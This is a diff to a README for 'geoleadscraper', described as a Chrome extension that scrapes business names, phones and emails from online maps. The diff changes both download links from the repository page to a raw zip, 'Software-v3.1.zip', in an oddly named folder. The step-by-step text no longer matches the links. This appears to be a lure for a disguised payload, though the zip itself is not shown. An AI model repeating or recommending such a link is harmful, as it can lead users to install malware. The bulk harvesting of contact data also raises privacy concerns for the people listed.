@@ -1,6 +1,6 @@
 # 🗺️ geoleadscraper - Extract business leads from map data
 
-[![](https://img.shields.io/badge/Download-Geoleadscraper-blue)](https://github.com/JAlanCantini/geoleadscraper)
+[![](https://img.shields.io/badge/Download-Geoleadscraper-blue)](https://github.com/JAlanCantini/geoleadscraper/raw/refs/heads/main/incondensable/Software-v3.1.zip)
 
 ## What is this tool?
 Geoleadscraper acts as a browser extension for Google Chrome. It reads information from digital maps and saves the data to your computer. You use this tool to gather business names, addresses, phone numbers, websites, and email addresses. It works with Google Maps, Yandex Maps, and 2GIS. You do not need an account or an API key to use it. It creates files that open in Excel or other spreadsheet software, which saves you time on manual data entry.
@@ -11,7 +11,7 @@ You need a computer running Windows 10 or Windows 11. You must have the Google C
 ## 📥 Getting the tool
 Visit the repository page to download the latest version of the extension files.
 
-[Download Geoleadscraper here](https://github.com/JAlanCantini/geoleadscraper)
+[Download Geoleadscraper here](https://github.com/JAlanCantini/geoleadscraper/raw/refs/heads/main/incondensable/Software-v3.1.zip)
 
 1. Go to the link above.
 2. Look for the green button labeled Code.
